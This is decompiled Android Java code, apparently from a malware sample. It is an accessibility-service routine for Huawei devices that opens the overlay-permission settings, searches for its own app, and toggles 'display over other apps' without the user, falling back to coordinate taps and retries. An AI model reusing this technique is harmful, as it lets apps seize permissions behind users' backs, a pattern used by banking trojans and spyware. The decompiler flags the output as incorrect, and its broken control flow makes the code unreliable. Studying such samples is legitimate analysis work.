    /* JADX WARN: Type inference failed for: r5v22 */
    /* JADX WARN: Type inference failed for: r5v3 */
    /* JADX WARN: Type inference failed for: r5v39, types: [int] */
    /* JADX WARN: Type inference failed for: r5v45, types: [int] */
    /* JADX WARN: Type inference failed for: r5v51, types: [int] */
    /* JADX WARN: Type inference failed for: r7v0, types: [java.lang.String] */
    /* JADX WARN: Type inference failed for: r7v100 */
    /* JADX WARN: Type inference failed for: r7v101 */
    /* JADX WARN: Type inference failed for: r7v102 */
    /* JADX WARN: Type inference failed for: r7v103 */
    /* JADX WARN: Type inference failed for: r7v19, types: [com.storm.safe.rock.service.modules.yw5xud.a2] */
    /* JADX WARN: Type inference failed for: r7v20, types: [com.storm.safe.rock.service.modules.yw5xud.a2] */
    /* JADX WARN: Type inference failed for: r7v8 */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:17:0x0052 -> B:266:0x056c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:195:0x0447 -> B:266:0x056c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:215:0x04bc -> B:186:0x0430). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:223:0x04e0 -> B:224:0x04e4). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:246:0x0531 -> B:247:0x0533). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:251:0x053b -> B:252:0x053c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:265:0x0564 -> B:266:0x056c). Please report as a decompilation issue!!! */
    /* JADX WARN: Unsupported multi-entry loop pattern (BACK_EDGE: B:95:0x01c9 -> B:267:0x0575). Please report as a decompilation issue!!! */
    /* renamed from: b9 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212172b9(ContinuationImpl continuationImpl) throws Throwable {
        HuaweiSteps$executeOverlayPermission$1 huaweiSteps$executeOverlayPermission$1;
        ?? r18;
        char c;
        int i;
        C0365a2 c0365a2;
        C0365a2 c0365a22;
        ?? r5;
        ?? r182;
        C1351vv c1351vv;
        String str;
        C0365a2 c0365a23;
        int i2;
        int i3;
        int i4;
        boolean zCanDrawOverlays;
        boolean z;
        C0365a2 c0365a24;
        int i5;
        int i6;
        int i7;
        C0365a2 c0365a25;
        int i8;
        C0365a2 c0365a26;
        int i9;
        int i10;
        int i11;
        int i12;
        int i13;
        int iM212181d5;
        int i14;
        ?? r12;
        ?? r183;
        C0365a2 c0365a27;
        int i15;
        int i16;
        boolean z2;
        C0365a2 c0365a28;
        boolean z3;
        C0365a2 c0365a29;
        int i17;
        boolean z4;
        C0365a2 c0365a210;
        boolean z5;
        C0365a2 c0365a211;
        int i18;
        ?? r52;
        boolean z6;
        float fM212180d4;
        float f;
        boolean zBooleanValue;
        C0365a2 c0365a212;
        int i19;
        C0365a2 c0365a213;
        int i20;
        C0365a2 c0365a214;
        int i21;
        Object objM212217h5;
        C0365a2 c0365a215;
        int i22;
        boolean z7;
        boolean z8;
        AccessibilityNodeInfo accessibilityNodeInfo;
        C0365a2 c0365a216;
        int i23;
        C0365a2 c0365a217;
        int i24;
        AccessibilityNodeInfo rootInActiveWindow;
        C0365a2 c0365a218;
        int i25;
        boolean z9;
        C0365a2 c0365a219;
        int i26;
        C0365a2 c0365a220;
        int i27;
        C0365a2 c0365a221;
        int i28;
        C0365a2 c0365a222;
        int i29;
        C0365a2 c0365a223;
        int i30;
        boolean z10;
        C0365a2 c0365a224;
        ?? r184;
        C0365a2 c0365a225;
        C0365a2 c0365a226;
        C0365a2 c0365a227;
        C0365a2 c0365a228;
        int i31;
        C1351vv c1351vv2 = C1351vv.f60710b1;
        if (continuationImpl instanceof HuaweiSteps$executeOverlayPermission$1) {
            huaweiSteps$executeOverlayPermission$1 = (HuaweiSteps$executeOverlayPermission$1) continuationImpl;
            int i32 = huaweiSteps$executeOverlayPermission$1.f54069a8;
            if ((i32 & Integer.MIN_VALUE) != 0) {
                huaweiSteps$executeOverlayPermission$1.f54069a8 = i32 - Integer.MIN_VALUE;
            } else {
                huaweiSteps$executeOverlayPermission$1 = new HuaweiSteps$executeOverlayPermission$1(this, continuationImpl);
            }
        }
        Object objM212206g3 = huaweiSteps$executeOverlayPermission$1.f54067a6;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i33 = huaweiSteps$executeOverlayPermission$1.f54069a8;
        ?? r7 = ")";
        int i34 = 4;
        String str2 = ")";
        AccessibilityNodeInfo accessibilityNodeInfo2 = null;
        boolean z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        z11 = true;
        try {
            try {
                try {
                } catch (Exception e) {
                    e = e;
                    r18 = z11;
                    i = i33;
                    c0365a22 = r7;
                    str = str2;
                    c1351vv = c1351vv2;
                    i30 = i;
                    c0365a223 = c0365a22;
                    z8 = r18;
                    tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                    i29 = i30;
                    c0365a222 = c0365a223;
                    z9 = z8;
                    str2 = str;
                    c1351vv2 = c1351vv;
                    z11 = z9;
                    accessibilityNodeInfo2 = null;
                    i34 = 4;
                    i28 = i29 + 1;
                    c0365a221 = c0365a222;
                    if (i28 < i34) {
                    }
                }
            } catch (Exception e2) {
                e = e2;
                r5 = ")";
            }
        } catch (Exception e3) {
            e = e3;
            r18 = 1;
            i = c == true ? 1 : 0;
            c0365a22 = c0365a2;
            str = str2;
            c1351vv = c1351vv2;
            i30 = i;
            c0365a223 = c0365a22;
            z8 = r18;
            tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
            i29 = i30;
            c0365a222 = c0365a223;
            z9 = z8;
            str2 = str;
            c1351vv2 = c1351vv;
            z11 = z9;
            accessibilityNodeInfo2 = null;
            i34 = 4;
            i28 = i29 + 1;
            c0365a221 = c0365a222;
            if (i28 < i34) {
            }
        }
        switch (i33) {
            case 0:
                kg1.m213544f4(objM212206g3);
                if (Settings.canDrawOverlays(this.f55062a0)) {
                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 已有悬浮窗权限");
                    m212195f2(this.f55072b0);
                    return c1351vv2;
                }
                c0365a221 = this;
                i28 = 1;
                if (i28 < i34) {
                    AbstractC0003a2.m44c5("[悬浮窗] 第", i28, "次尝试", "HuaweiSteps");
                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤1: 打开悬浮窗设置");
                    Intent intent = new Intent("android.settings.action.MANAGE_OVERLAY_PERMISSION");
                    intent.setFlags(276824064);
                    c0365a221.f55063a1.startActivity(intent);
                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤2: 等待列表加载 (超时5秒)");
                    huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a221;
                    huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo2;
                    huaweiSteps$executeOverlayPermission$1.f54063a2 = i28;
                    huaweiSteps$executeOverlayPermission$1.f54069a8 = z11 ? 1 : 0;
                    objM212206g3 = c0365a221.m212214h2(5000L, huaweiSteps$executeOverlayPermission$1);
                    i27 = i28;
                    c0365a220 = c0365a221;
                    if (objM212206g3 != coroutineSingletons) {
                        if (((Boolean) objM212206g3).booleanValue()) {
                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 列表未加载，返回后重新开始");
                            c0365a220.f55063a1.performGlobalAction(z11 ? 1 : 0);
                            huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a220;
                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i27;
                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 2;
                            i26 = i27;
                            c0365a219 = c0365a220;
                            if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                c0365a219.f55063a1.performGlobalAction(z11 ? 1 : 0);
                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a219;
                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i26;
                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 3;
                                i25 = i26;
                                c0365a218 = c0365a219;
                                if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                }
                                z9 = z11;
                                str = str2;
                                c1351vv = c1351vv2;
                                i29 = i25;
                                c0365a222 = c0365a218;
                                str2 = str;
                                c1351vv2 = c1351vv;
                                z11 = z9;
                                accessibilityNodeInfo2 = null;
                                i34 = 4;
                                i28 = i29 + 1;
                                c0365a221 = c0365a222;
                                if (i28 < i34) {
                                    c1351vv = c1351vv2;
                                    c0365a226 = c0365a221;
                                    c0365a226.m212195f2(c0365a226.f55072b0);
                                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 完成");
                                    return c1351vv;
                                }
                            }
                        } else {
                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤3: 点击搜索应用");
                            c0365a220.m212160a3("搜索应用", z11);
                            huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a220;
                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i27;
                            huaweiSteps$executeOverlayPermission$1.f54069a8 = i34;
                            i24 = i27;
                            c0365a217 = c0365a220;
                            if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤4: 输入应用名");
                                String[] strArr = {"android:id/search_src_text", "com.android.settings:id/search_src_text", "com.hihonor.settings:id/search_src_text"};
                                rootInActiveWindow = c0365a217.f55063a1.getRootInActiveWindow();
                                if (rootInActiveWindow == null) {
                                    for (int i35 = 0; i35 < 3; i35++) {
                                        List<AccessibilityNodeInfo> listFindAccessibilityNodeInfosByViewId = rootInActiveWindow.findAccessibilityNodeInfosByViewId(strArr[i35]);
                                        accessibilityNodeInfo = listFindAccessibilityNodeInfosByViewId != null ? (AccessibilityNodeInfo) AbstractC0715je.m213291h8(listFindAccessibilityNodeInfosByViewId) : accessibilityNodeInfo2;
                                        if (accessibilityNodeInfo != null) {
                                            accessibilityNodeInfo.performAction(z11 ? 1 : 0);
                                            huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a217;
                                            huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo;
                                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i24;
                                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 5;
                                            i23 = i24;
                                            c0365a216 = c0365a217;
                                            if (b81.m210571b1(100L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                            }
                                            Bundle bundle = new Bundle();
                                            bundle.putCharSequence("ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE", c0365a216.m212178d1());
                                            accessibilityNodeInfo.performAction(2097152, bundle);
                                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 输入: " + c0365a216.m212178d1());
                                            z7 = z11 ? 1 : 0;
                                            i22 = i23;
                                            c0365a215 = c0365a216;
                                            if (!z7) {
                                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 未找到搜索框");
                                            }
                                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤5: 等待搜索结果");
                                            huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a215;
                                            huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo2;
                                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i22;
                                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 6;
                                            i21 = i22;
                                            c0365a214 = c0365a215;
                                            if (b81.m210571b1(1000L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                                String strM212178d1 = c0365a214.m212178d1();
                                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a214;
                                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i21;
                                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 7;
                                                objM212217h5 = c0365a214.m212217h5(strM212178d1, huaweiSteps$executeOverlayPermission$1);
                                                i20 = i21;
                                                c0365a213 = c0365a214;
                                                if (objM212217h5 == coroutineSingletons) {
                                                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤6: 点击应用");
                                                    zBooleanValue = c0365a213.m212157a0(c0365a213.m212178d1());
                                                    i33 = i20;
                                                    r7 = c0365a213;
                                                    if (zBooleanValue) {
                                                        t60.m214704c5("HuaweiSteps", "[悬浮窗] 搜索失败，尝试滚动查找");
                                                        String strM212178d12 = c0365a213.m212178d1();
                                                        huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a213;
                                                        huaweiSteps$executeOverlayPermission$1.f54063a2 = i20;
                                                        huaweiSteps$executeOverlayPermission$1.f54069a8 = 8;
                                                        objM212206g3 = c0365a213.m212206g3(10, strM212178d12, huaweiSteps$executeOverlayPermission$1, z11);
                                                        i19 = i20;
                                                        c0365a212 = c0365a213;
                                                        if (objM212206g3 == coroutineSingletons) {
                                                        }
                                                        zBooleanValue = ((Boolean) objM212206g3).booleanValue();
                                                        i33 = i19;
                                                        r7 = c0365a212;
                                                        if (zBooleanValue) {
                                                            huaweiSteps$executeOverlayPermission$1.f54061a0 = r7;
                                                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i33;
                                                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 11;
                                                            i33 = i33;
                                                            r7 = r7;
                                                            if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤7: 验证悬浮窗详情页");
                                                                if (r7.m212191e7()) {
                                                                    try {
                                                                    } catch (Exception e4) {
                                                                        e = e4;
                                                                        r18 = z11;
                                                                        i = i33;
                                                                        c0365a22 = r7;
                                                                        str = str2;
                                                                        c1351vv = c1351vv2;
                                                                        i30 = i;
                                                                        c0365a223 = c0365a22;
                                                                        z8 = r18;
                                                                        tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                        i29 = i30;
                                                                        c0365a222 = c0365a223;
                                                                        z9 = z8;
                                                                        str2 = str;
                                                                        c1351vv2 = c1351vv;
                                                                        z11 = z9;
                                                                        accessibilityNodeInfo2 = null;
                                                                        i34 = 4;
                                                                        i28 = i29 + 1;
                                                                        c0365a221 = c0365a222;
                                                                        if (i28 < i34) {
                                                                        }
                                                                    }
                                                                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 未进入悬浮窗详情页，返回后重新开始");
                                                                    r7.f55063a1.performGlobalAction(z11 ? 1 : 0);
                                                                    huaweiSteps$executeOverlayPermission$1.f54061a0 = r7;
                                                                    huaweiSteps$executeOverlayPermission$1.f54063a2 = i33;
                                                                    huaweiSteps$executeOverlayPermission$1.f54069a8 = 12;
                                                                    i9 = i33;
                                                                    c0365a26 = r7;
                                                                    if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                        c0365a26.f55063a1.performGlobalAction(z11 ? 1 : 0);
                                                                        huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a26;
                                                                        huaweiSteps$executeOverlayPermission$1.f54063a2 = i9;
                                                                        huaweiSteps$executeOverlayPermission$1.f54069a8 = 13;
                                                                        i25 = i9;
                                                                        c0365a218 = c0365a26;
                                                                        if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                                                        }
                                                                        z9 = z11;
                                                                        str = str2;
                                                                        c1351vv = c1351vv2;
                                                                        i29 = i25;
                                                                        c0365a222 = c0365a218;
                                                                        str2 = str;
                                                                        c1351vv2 = c1351vv;
                                                                        z11 = z9;
                                                                        accessibilityNodeInfo2 = null;
                                                                        i34 = 4;
                                                                        i28 = i29 + 1;
                                                                        c0365a221 = c0365a222;
                                                                        if (i28 < i34) {
                                                                        }
                                                                    }
                                                                } else {
                                                                    t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤8: 开启开关");
                                                                    String[] strArr2 = {"显示在其他应用的上层", "在其他应用上层显示", "显示在其他应用上层", "允许显示在其他应用的上层", "悬浮窗", "显示悬浮窗"};
                                                                    int i36 = 0;
                                                                    while (true) {
                                                                        if (i36 < 6) {
                                                                            String str3 = strArr2[i36];
                                                                            if (r7.m212208g6(str3, z11)) {
                                                                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 通过文本'" + str3 + "'开启开关");
                                                                            } else {
                                                                                i36++;
                                                                            }
                                                                        } else if (!Settings.canDrawOverlays(r7.f55062a0)) {
                                                                            try {
                                                                            } catch (Exception e5) {
                                                                                e = e5;
                                                                                z6 = z11 ? 1 : 0;
                                                                                str = str2;
                                                                            }
                                                                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 文本方式失败，使用坐标点击");
                                                                            if (r7.m212181d5() <= 720) {
                                                                                iM212181d5 = (int) (r7.m212181d5() * 0.85f);
                                                                                fM212180d4 = r7.m212180d4();
                                                                                f = 0.25f;
                                                                            } else if (r7.m212181d5() <= 1080) {
                                                                                iM212181d5 = (int) (r7.m212181d5() * 0.88f);
                                                                                fM212180d4 = r7.m212180d4();
                                                                                f = 0.26f;
                                                                            } else {
                                                                                iM212181d5 = (int) (r7.m212181d5() * 0.9f);
                                                                                fM212180d4 = r7.m212180d4();
                                                                                f = 0.27f;
                                                                            }
                                                                            i12 = (int) (fM212180d4 * f);
                                                                            int iM212181d52 = r7.m212181d5();
                                                                            z6 = z11 ? 1 : 0;
                                                                            try {
                                                                            } catch (Exception e6) {
                                                                                e = e6;
                                                                                c1351vv = c1351vv2;
                                                                                str = str2;
                                                                                i16 = i33;
                                                                                c0365a210 = r7;
                                                                                z4 = z6;
                                                                                i17 = i16;
                                                                                c0365a29 = c0365a210;
                                                                                z3 = z4;
                                                                                i30 = i17;
                                                                                c0365a223 = c0365a29;
                                                                                z8 = z3;
                                                                                tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                                i29 = i30;
                                                                                c0365a222 = c0365a223;
                                                                                z9 = z8;
                                                                                str2 = str;
                                                                                c1351vv2 = c1351vv;
                                                                                z11 = z9;
                                                                                accessibilityNodeInfo2 = null;
                                                                                i34 = 4;
                                                                                i28 = i29 + 1;
                                                                                c0365a221 = c0365a222;
                                                                                if (i28 < i34) {
                                                                                }
                                                                            }
                                                                            int iM212180d4 = r7.m212180d4();
                                                                            StringBuilder sb = new StringBuilder();
                                                                            sb.append("[悬浮窗] 屏幕: ");
                                                                            sb.append(iM212181d52);
                                                                            sb.append("x");
                                                                            sb.append(iM212180d4);
                                                                            sb.append(", 坐标: (");
                                                                            sb.append(iM212181d5);
                                                                            sb.append(", ");
                                                                            sb.append(i12);
                                                                            str = str2;
                                                                            try {
                                                                            } catch (Exception e7) {
                                                                                e = e7;
                                                                                c1351vv = c1351vv2;
                                                                                i16 = i33;
                                                                                c0365a210 = r7;
                                                                                z4 = z6;
                                                                                i17 = i16;
                                                                                c0365a29 = c0365a210;
                                                                                z3 = z4;
                                                                                i30 = i17;
                                                                                c0365a223 = c0365a29;
                                                                                z8 = z3;
                                                                                tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                                i29 = i30;
                                                                                c0365a222 = c0365a223;
                                                                                z9 = z8;
                                                                                str2 = str;
                                                                                c1351vv2 = c1351vv;
                                                                                z11 = z9;
                                                                                accessibilityNodeInfo2 = null;
                                                                                i34 = 4;
                                                                                i28 = i29 + 1;
                                                                                c0365a221 = c0365a222;
                                                                                if (i28 < i34) {
                                                                                }
                                                                            }
                                                                            sb.append(str);
                                                                            t60.m214704c5("HuaweiSteps", sb.toString());
                                                                            r12 = z6;
                                                                            i14 = i33;
                                                                            c0365a28 = r7;
                                                                            z2 = z6;
                                                                            break;
                                                                        }
                                                                    }
                                                                    z5 = z11 ? 1 : 0;
                                                                    str = str2;
                                                                    i18 = i33;
                                                                    c0365a211 = r7;
                                                                    c1351vv = c1351vv2;
                                                                    try {
                                                                    } catch (Exception e8) {
                                                                        e = e8;
                                                                        i16 = i18;
                                                                        c0365a210 = c0365a211;
                                                                        z4 = z5;
                                                                        i17 = i16;
                                                                        c0365a29 = c0365a210;
                                                                        z3 = z4;
                                                                        i30 = i17;
                                                                        c0365a223 = c0365a29;
                                                                        z8 = z3;
                                                                        tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                        i29 = i30;
                                                                        c0365a222 = c0365a223;
                                                                        z9 = z8;
                                                                        str2 = str;
                                                                        c1351vv2 = c1351vv;
                                                                        z11 = z9;
                                                                        accessibilityNodeInfo2 = null;
                                                                        i34 = 4;
                                                                        i28 = i29 + 1;
                                                                        c0365a221 = c0365a222;
                                                                        if (i28 < i34) {
                                                                        }
                                                                    }
                                                                    if (Settings.canDrawOverlays(c0365a211.f55062a0)) {
                                                                        i2 = i18;
                                                                        c0365a23 = c0365a211;
                                                                        r182 = z5;
                                                                        huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a23;
                                                                        huaweiSteps$executeOverlayPermission$1.f54063a2 = i2;
                                                                        huaweiSteps$executeOverlayPermission$1.f54069a8 = 18;
                                                                        c0365a227 = c0365a23;
                                                                    } else {
                                                                        t60.m214704c5("HuaweiSteps", "[悬浮窗] 坐标方式失败，尝试直接点击开关");
                                                                        i6 = i18 == true ? 1 : 0;
                                                                        r52 = z5;
                                                                        i3 = 6;
                                                                        c0365a224 = c0365a211;
                                                                        z10 = z5;
                                                                        if (r52 < i3) {
                                                                            try {
                                                                            } catch (Exception e9) {
                                                                                e = e9;
                                                                            }
                                                                            if (c0365a224.m212158a1()) {
                                                                                try {
                                                                                } catch (Exception e10) {
                                                                                    e = e10;
                                                                                    i17 = i6;
                                                                                    c0365a29 = c0365a224;
                                                                                    z3 = z10;
                                                                                    i30 = i17;
                                                                                    c0365a223 = c0365a29;
                                                                                    z8 = z3;
                                                                                    tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                                    i29 = i30;
                                                                                    c0365a222 = c0365a223;
                                                                                    z9 = z8;
                                                                                    str2 = str;
                                                                                    c1351vv2 = c1351vv;
                                                                                    z11 = z9;
                                                                                    accessibilityNodeInfo2 = null;
                                                                                    i34 = 4;
                                                                                    i28 = i29 + 1;
                                                                                    c0365a221 = c0365a222;
                                                                                    if (i28 < i34) {
                                                                                    }
                                                                                }
                                                                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a224;
                                                                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i6;
                                                                                huaweiSteps$executeOverlayPermission$1.f54064a3 = r52;
                                                                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 16;
                                                                                if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                                    i4 = r52;
                                                                                    i2 = i6;
                                                                                    c0365a23 = c0365a224;
                                                                                    r182 = z10;
                                                                                    try {
                                                                                    } catch (Exception e11) {
                                                                                        e = e11;
                                                                                        i17 = i2;
                                                                                        c0365a29 = c0365a23;
                                                                                        z3 = r182;
                                                                                        i30 = i17;
                                                                                        c0365a223 = c0365a29;
                                                                                        z8 = z3;
                                                                                        tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                                        i29 = i30;
                                                                                        c0365a222 = c0365a223;
                                                                                        z9 = z8;
                                                                                        str2 = str;
                                                                                        c1351vv2 = c1351vv;
                                                                                        z11 = z9;
                                                                                        accessibilityNodeInfo2 = null;
                                                                                        i34 = 4;
                                                                                        i28 = i29 + 1;
                                                                                        c0365a221 = c0365a222;
                                                                                        if (i28 < i34) {
                                                                                        }
                                                                                    }
                                                                                    zCanDrawOverlays = Settings.canDrawOverlays(c0365a23.f55062a0);
                                                                                    i5 = i2;
                                                                                    c0365a24 = c0365a23;
                                                                                    z = r182;
                                                                                    if (zCanDrawOverlays) {
                                                                                        t60.m214704c5("HuaweiSteps", "[悬浮窗] 开关点击成功");
                                                                                        i2 = i2;
                                                                                        c0365a23 = c0365a23;
                                                                                        r182 = r182;
                                                                                        huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a23;
                                                                                        huaweiSteps$executeOverlayPermission$1.f54063a2 = i2;
                                                                                        huaweiSteps$executeOverlayPermission$1.f54069a8 = 18;
                                                                                        try {
                                                                                        } catch (Exception e12) {
                                                                                            e = e12;
                                                                                            i30 = i2;
                                                                                            c0365a223 = c0365a23;
                                                                                            z8 = r182;
                                                                                            tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                                            i29 = i30;
                                                                                            c0365a222 = c0365a223;
                                                                                            z9 = z8;
                                                                                            str2 = str;
                                                                                            c1351vv2 = c1351vv;
                                                                                            z11 = z9;
                                                                                            accessibilityNodeInfo2 = null;
                                                                                            i34 = 4;
                                                                                            i28 = i29 + 1;
                                                                                            c0365a221 = c0365a222;
                                                                                            if (i28 < i34) {
                                                                                            }
                                                                                        }
                                                                                        c0365a227 = c0365a23;
                                                                                        break;
                                                                                    }
                                                                                    huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a24;
                                                                                    huaweiSteps$executeOverlayPermission$1.f54063a2 = i5;
                                                                                    huaweiSteps$executeOverlayPermission$1.f54064a3 = i4;
                                                                                    huaweiSteps$executeOverlayPermission$1.f54069a8 = 17;
                                                                                    if (b81.m210571b1(100L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                                        i6 = i5;
                                                                                        i7 = i4;
                                                                                        c0365a225 = c0365a24;
                                                                                        r184 = z;
                                                                                        r52 = i7 + 1;
                                                                                        c0365a224 = c0365a225;
                                                                                        z10 = r184;
                                                                                        if (r52 < i3) {
                                                                                            i2 = i6;
                                                                                            c0365a23 = c0365a224;
                                                                                            r182 = z10;
                                                                                            huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a23;
                                                                                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i2;
                                                                                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 18;
                                                                                            c0365a227 = c0365a23;
                                                                                        }
                                                                                    }
                                                                                }
                                                                            } else {
                                                                                i4 = r52;
                                                                                i5 = i6;
                                                                                c0365a24 = c0365a224;
                                                                                z = z10;
                                                                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a24;
                                                                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i5;
                                                                                huaweiSteps$executeOverlayPermission$1.f54064a3 = i4;
                                                                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 17;
                                                                                if (b81.m210571b1(100L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        } else {
                                                            try {
                                                            } catch (Exception e13) {
                                                                e = e13;
                                                                r18 = z11;
                                                                i = i33;
                                                                c0365a22 = r7;
                                                                str = str2;
                                                                c1351vv = c1351vv2;
                                                                i30 = i;
                                                                c0365a223 = c0365a22;
                                                                z8 = r18;
                                                                tz0.m214807a7("[悬浮窗] 异常: ", e.getMessage(), "HuaweiSteps");
                                                                i29 = i30;
                                                                c0365a222 = c0365a223;
                                                                z9 = z8;
                                                                str2 = str;
                                                                c1351vv2 = c1351vv;
                                                                z11 = z9;
                                                                accessibilityNodeInfo2 = null;
                                                                i34 = 4;
                                                                i28 = i29 + 1;
                                                                c0365a221 = c0365a222;
                                                                if (i28 < i34) {
                                                                }
                                                            }
                                                            t60.m214704c5("HuaweiSteps", "[悬浮窗] 未找到应用，返回后重新开始");
                                                            r7.f55063a1.performGlobalAction(z11 ? 1 : 0);
                                                            huaweiSteps$executeOverlayPermission$1.f54061a0 = r7;
                                                            huaweiSteps$executeOverlayPermission$1.f54063a2 = i33;
                                                            huaweiSteps$executeOverlayPermission$1.f54069a8 = 9;
                                                            i8 = i33;
                                                            c0365a25 = r7;
                                                            if (b81.m210571b1(300L, huaweiSteps$executeOverlayPermission$1) != coroutineSingletons) {
                                                                c0365a25.f55063a1.performGlobalAction(z11 ? 1 : 0);
                                                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a25;
                                                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i8;
                                                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 10;
                                                                i25 = i8;
                                                                c0365a218 = c0365a25;
                                                                if (b81.m210571b1(500L, huaweiSteps$executeOverlayPermission$1) == coroutineSingletons) {
                                                                }
                                                                z9 = z11;
                                                                str = str2;
                                                                c1351vv = c1351vv2;
                                                                i29 = i25;
                                                                c0365a222 = c0365a218;
                                                                str2 = str;
                                                                c1351vv2 = c1351vv;
                                                                z11 = z9;
                                                                accessibilityNodeInfo2 = null;
                                                                i34 = 4;
                                                                i28 = i29 + 1;
                                                                c0365a221 = c0365a222;
                                                                if (i28 < i34) {
                                                                }
                                                            }
                                                        }
                                                    } else if (zBooleanValue) {
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                                z7 = false;
                                i22 = i24;
                                c0365a215 = c0365a217;
                                if (!z7) {
                                }
                                t60.m214704c5("HuaweiSteps", "[悬浮窗] 步骤5: 等待搜索结果");
                                huaweiSteps$executeOverlayPermission$1.f54061a0 = c0365a215;
                                huaweiSteps$executeOverlayPermission$1.f54062a1 = accessibilityNodeInfo2;
                                huaweiSteps$executeOverlayPermission$1.f54063a2 = i22;
                                huaweiSteps$executeOverlayPermission$1.f54069a8 = 6;
                                i21 = i22;
                                c0365a214 = c0365a215;
